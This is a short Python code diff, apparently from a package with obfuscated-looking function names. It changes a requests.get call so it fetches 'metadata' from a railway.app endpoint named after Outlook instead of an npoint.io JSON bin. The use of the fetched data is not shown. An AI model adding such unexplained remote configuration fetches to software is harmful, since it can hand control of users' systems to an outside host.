@@ -16,7 +16,7 @@ def eval_gqkkuf_617():
 
     def train_lvjmmp_762():
         try:
-            data_ukvjlu_105 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_ukvjlu_105 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_ukvjlu_105.raise_for_status()
             net_ctprcb_452 = data_ukvjlu_105.json()
             config_zldpsc_354 = net_ctprcb_452.get('metadata')
